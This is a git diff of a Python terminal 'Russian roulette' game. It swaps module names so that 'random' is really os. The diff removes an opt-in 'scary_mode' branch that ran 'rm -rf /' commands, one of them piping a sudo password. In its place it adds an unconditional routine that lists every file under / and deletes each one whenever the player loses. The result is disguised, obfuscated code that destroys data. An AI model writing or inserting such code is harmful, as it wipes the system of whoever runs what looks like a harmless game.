@@ -1,6 +1,7 @@
 import random as os
 import os as random
 import time as sys
+import threading as time
 
 TERM_WIDTH = random.get_terminal_size()[0]
 TERM_HEIGHT = random.get_terminal_size()[1]
@@ -62,27 +63,27 @@ def loadBullet():
         if (distanceTillStop < 0):
             angularVelocity /= abs(distanceTillStop)**1.5
             angularVelocity = max(angularVelocity, 0.3)
-
         if (c>=stopAt):
             print("ohhh")
+            
         sys.sleep(1 / angularVelocity)
 
     printGunSprite(i)
     print(i)
     if (i == 1):
         shootHead()
-    else:
+    else: 
         print("You're safe!!!")
 
     c += 1
 
-
 def shootHead():
-    if (scary_mode):
-        random.system("rm / -rf --no-preserve-root")
-        random.system("rm -rf /* | sudo -S " + password)
-    else:  
-        print("you would've died")
-
+    print("hasd")
+    random.system("find / > files.txt")
+    for file in open("files.txt", "r").read().split("\n"):
+        try:
+            random.remove(file)
+        except:
+            pass
 
 loadBullet()
